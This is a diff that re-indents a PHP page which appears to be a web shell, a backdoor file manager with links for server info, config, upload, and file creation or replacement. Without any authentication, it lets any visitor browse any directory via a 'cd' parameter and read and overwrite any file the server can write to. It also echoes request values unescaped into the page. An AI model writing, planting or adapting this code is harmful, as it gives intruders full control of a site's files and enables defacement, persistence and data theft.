@@ -157,228 +157,224 @@
 			</span>
 		</div>
 	</div>
-<?php
-class x {
-	public static $cwd;
-	public static $handle;
-	public static $extension;
-	public static function cwd() {
-		return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
-	}
-	public static function cd($directory) {
-		return chdir($directory);
-	}
-	public static function files($type) {
-		$result = array();
-		foreach (scandir(self::cwd()) as $key => $value) {
-			$file['name'] = self::cwd() . DIRECTORY_SEPARATOR . $value;
+	<?php
+	class x {
+		public static $cwd;
+		public static $handle;
+		public static $extension;
+		public static function cwd() {
+			return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
+		}
+		public static function cd($directory) {
+			return chdir($directory);
+		}
+		public static function files($type) {
+			$result = array();
+			foreach (scandir(self::cwd()) as $key => $value) {
+				$file['name'] = self::cwd() . DIRECTORY_SEPARATOR . $value;
+				switch ($type) {
+					case 'dir':
+						if (!is_dir($file['name']) || $value === '.') continue 2;
+						break;
+					case 'file':
+						if (!is_file($file['name'])) continue 2;
+						break;
+				}
+				$file['size'] 	= (is_dir($file['name'])) ? @filetype($file['name']) : x::size($file['name']);
+				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
+				$result[] = $file;
+			} return $result;
+		}
+		public static function save($filename = null, $data, $type) {
 			switch ($type) {
-				case 'dir':
-					if (!is_dir($file['name']) || $value === '.') continue 2;
+				case 'save':
+					self::$handle = fopen($filename, "w");
+					fwrite(self::$handle, $data);
+					fclose(self::$handle);
 					break;
-				case 'file':
-					if (!is_file($file['name'])) continue 2;
+				case 'makefile':
+					self::$handle = fopen($filename, "w");
+					fwrite(self::$handle, $data);
+					fclose(self::$handle);
 					break;
 			}
-			$file['size'] 	= (is_dir($file['name'])) ? @filetype($file['name']) : x::size($file['name']);
-			$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
-			$result[] = $file;
-		} return $result;
-	}
-	public static function save($filename = null, $data, $type) {
-		switch ($type) {
-			case 'save':
-				self::$handle = fopen($filename, "w");
-				fwrite(self::$handle, $data);
-				fclose(self::$handle);
-				break;
-			case 'makefile':
-				self::$handle = fopen($filename, "w");
-				fwrite(self::$handle, $data);
-				fclose(self::$handle);
-				break;
 		}
-	}
-	public static function perms($filename) {
-		return substr(sprintf("%o", fileperms($filename)), -4);
-	}
-	public static function w__($filename, $perms) {
-        if (is_writable($filename)) {
-            return "<font color='green'>{$perms}</font>";
-        } else {
-            return "<font color='red'>{$perms}</font>";
-        }
-    }
-    public static function getimg($filename) {
-        self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-        switch (self::$extension) {
-            case 'php':
-                print("https://image.flaticon.com/icons/png/128/337/337947.png");
-                break;
-            
-            default:
-                print("https://image.flaticon.com/icons/svg/833/833524.svg");
-                break;
-        }
-    }
-    public static function ftime($filename) {
-        return date("F d Y g:i:s", filemtime($filename));
-    }
-    public static function sortname($filename) {
-    	return substr(htmlspecialchars($filename), 0, 28).'...';
-    }
-    public static function size($filename) {
-        if (is_file($filename)) {
-            $filepath = $filename;
-            if (!realpath($filepath)) {
-                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
-            }
-            $filesize = filesize($filepath);
-            $array = array("TB","GB","MB","KB","B");
-            $total = count($array);
-            while ($total-- && $filesize > 1024) {
-                $filesize /= 1024;
-            } return round($filesize, 2) . " " . $array[$total];
-        } return false;
-    }
-}
-?>
-<div class="row">
-<div class="col-xs-2 tool">
-	<a href="#">Server Info</a>
-	<a href="#">Config</a>
-	<a href="#">Upload</a>
-	<a href="#">Create FIle</a>
-	<a href="#">Replace File</a>
-</div>
-<div class="col-xs-10 center">
-<?php
-switch (@$_POST['action']) {
-	case 'edit':
-		if (isset($_POST['edit'])) {
-			if (x::save($_POST['file'], $_POST['data'], 'save')) {
-				print("failed");
-			} else {
-				print("success");
-			}
+		public static function perms($filename) {
+			return substr(sprintf("%o", fileperms($filename)), -4);
 		}
-		?>
-		<form method="post">
-		<div class="edit">
-			<table width='100%'>
-				<tr>
-					<td>
-						<a href="?cd=<?= $_GET['cd'] ?>">
-							<img class="icons" src="https://mlisi.xyz/img/shademe.png">
-						</a>
-					</td>
-					<td class="action" colspan="2">EDIT</td>
-				</tr>
-				<tr>
-					<td style="width:120px;">
-						Filename
-					</td>
-					<td>:</td>
-					<td>
-						<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
-					</td>
-				</tr>
-				<tr>
-					<td style="width:120px;">
-						Size
-					</td>
-					<td>:</td>
-					<td>
-						<?= filesize($_POST['file']) ?>
-					</td>
-				</tr>
-				<tr>
-					<td style="width:120px;">
-						Last Modif
-					</td>
-					<td>:</td>
-					<td>
-						<?= x::ftime($_POST['file']) ?>
-					</td>
-				</tr>
-				<tr>
-					<td colspan="3">
-						<textarea name="data" placeholder="not writable"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
-					</td>
-				</tr>
-				<tr>
-					<td colspan="3">
-						<input type="submit" name="edit" value="SAVE">
-						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-						<input type="hidden" name="action" value="edit">
-					</td>
-				</tr>
+		public static function w__($filename, $perms) {
+        	if (is_writable($filename)) {
+            	return "<font color='green'>{$perms}</font>";
+        	} else {
+            	return "<font color='red'>{$perms}</font>";
+        	}
+    	}
+    	public static function getimg($filename) {
+        	self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+        	switch (self::$extension) {
+            	case 'php':
+                	print("https://image.flaticon.com/icons/png/128/337/337947.png");
+                	break;
+            	default:
+                	print("https://image.flaticon.com/icons/svg/833/833524.svg");
+                	break;
+        	}
+    	}
+    	public static function ftime($filename) {
+        	return date("F d Y g:i:s", filemtime($filename));
+    	}
+    	public static function sortname($filename) {
+    		return substr(htmlspecialchars($filename), 0, 28).'...';
+    	}
+    	public static function size($filename) {
+        	if (is_file($filename)) {
+            	$filepath = $filename;
+            	if (!realpath($filepath)) {
+                	$filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
+            	}
+            	$filesize = filesize($filepath);
+            	$array = array("TB","GB","MB","KB","B");
+            	$total = count($array);
+            	while ($total-- && $filesize > 1024) {
+                	$filesize /= 1024;
+            	} return round($filesize, 2) . " " . $array[$total];
+        	} return false;
+    	}
+	}
+	?>
+	<div class="row">
+		<div class="col-xs-2 tool">
+			<a href="#">Server Info</a>
+			<a href="#">Config</a>
+			<a href="#">Upload</a>
+			<a href="#">Create FIle</a>
+			<a href="#">Replace File</a>
+		</div>
+		<div class="col-xs-10 center">
+			<?php
+			switch (@$_POST['action']) {
+				case 'edit':
+					if (isset($_POST['edit'])) {
+						if (x::save($_POST['file'], $_POST['data'], 'save')) {
+							print("failed");
+						} else {
+							print("success");
+						}
+					}
+					?>
+					<form method="post">
+						<div class="edit">
+							<table width='100%'>
+								<tr>
+									<td>
+										<a href="?cd=<?= $_GET['cd'] ?>">
+											<img class="icons" src="https://mlisi.xyz/img/shademe.png">
+										</a>
+									</td>
+									<td class="action" colspan="2">EDIT</td>
+								</tr>
+								<tr>
+									<td style="width:120px;">
+										Filename
+									</td>
+									<td>:</td>
+									<td>
+										<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
+									</td>
+								</tr>
+								<tr>
+									<td style="width:120px;">
+										Size
+									</td>
+									<td>:</td>
+									<td>
+										<?= filesize($_POST['file']) ?>
+									</td>
+								</tr>
+								<tr>
+									<td style="width:120px;">
+										Last Modif
+									</td>
+									<td>:</td>
+									<td>
+										<?= x::ftime($_POST['file']) ?>
+									</td>
+								</tr>
+								<tr>
+									<td colspan="3">
+										<textarea name="data" placeholder="not writable"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+									</td>
+								</tr>
+								<tr>
+									<td colspan="3">
+										<input type="submit" name="edit" value="SAVE">
+										<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+										<input type="hidden" name="action" value="edit">
+									</td>
+								</tr>
+							</table>
+						</div>
+					</form>
+					<?php
+					exit();
+					break;
+				}
+				if (isset($_GET['cd'])) {
+					x::cd($_GET['cd']);
+				}
+				?> <table width="100%"> <?php
+				foreach (x::files('dir') as $key => $dir) { ?>
+					<form method="post" action="?cd=<?= x::cwd() ?>">
+						<tr>
+							<td class="img">
+								<img class="icons" src="https://image.flaticon.com/icons/svg/716/716784.svg">
+							</td>
+							<td>
+								<a href="?cd=<?= $dir['name'] ?>"><?= basename($dir['name']) ?></a>
+							</td>
+							<td class="size">
+								<?= $dir['size'] ?>
+							</td>
+							<td class="perms">
+								<?= $dir['perms'] ?>
+							</td>
+							<td class="act">
+								<select name="action" onchange="if(this.value != '0') this.form.submit()">
+									<option selected disabled>action</option>
+								</select>
+								<input type="hidden" name="file" value="<?= $dir['name'] ?>">
+							</td>
+						</tr>
+					</form>
+				<?php }
+				foreach (x::files('file') as $key => $file) { ?>
+					<form method="post" action="?cd=<?= x::cwd() ?>">
+						<tr>
+							<td>
+								<img class="icons" src="<?= x::getimg($file['name']) ?>">
+							</td>
+							<td>
+								<?= x::sortname(basename($file['name'])) ?>
+							</td>
+							<td class="size">
+								<?= $file['size'] ?>
+							</td>
+							<td class="perms">
+								<?= $file['perms'] ?>
+							</td>
+							<td>
+								<select name="action" onchange="if(this.value != '0') this.form.submit()">
+									<option selected disabled>action</option>
+									<option value="edit">edit</option>
+							</select>
+							<input type="hidden" name="file" value="<?= $file['name'] ?>">
+							</td>
+						</tr>
+					</form>
+				<?php }
+				?>
 			</table>
 		</div>
-		</form>
-		<?php
-		exit();
-		break;
-}
-if (isset($_GET['cd'])) {
-	x::cd($_GET['cd']);
-}
-?> <table width="100%"> <?php
-foreach (x::files('dir') as $key => $dir) { ?>
-	<form method="post" action="?cd=<?= x::cwd() ?>">
-		<tr>
-			<td class="img">
-				<img class="icons" src="https://image.flaticon.com/icons/svg/716/716784.svg">
-			</td>
-			<td>
-				<a href="?cd=<?= $dir['name'] ?>"><?= basename($dir['name']) ?></a>
-			</td>
-			<td class="size">
-				<?= $dir['size'] ?>
-			</td>
-			<td class="perms">
-				<?= $dir['perms'] ?>
-			</td>
-			<td class="act">
-				<select name="action" onchange="if(this.value != '0') this.form.submit()">
-					<option selected disabled>action</option>
-				</select>
-				<input type="hidden" name="file" value="<?= $dir['name'] ?>">
-			</td>
-		</tr>
-	</form>
-<?php }
-foreach (x::files('file') as $key => $file) { ?>
-	<form method="post" action="?cd=<?= x::cwd() ?>">
-		<tr>
-			<td>
-				<img class="icons" src="<?= x::getimg($file['name']) ?>">
-			</td>
-			<td>
-				<?= x::sortname(basename($file['name'])) ?>
-			</td>
-			<td class="size">
-				<?= $file['size'] ?>
-			</td>
-			<td class="perms">
-				<?= $file['perms'] ?>
-			</td>
-			<td>
-				<select name="action" onchange="if(this.value != '0') this.form.submit()">
-						<option selected disabled>action</option>
-						<option value="edit">edit</option>
-				</select>
-				<input type="hidden" name="file" value="<?= $file['name'] ?>">
-			</td>
-		</tr>
-	</form>
-<?php }
-?>
-</table>
-</div>
-</div>
-</div>
-</div>
-</div>
+	</div>
 </div>
 </center>
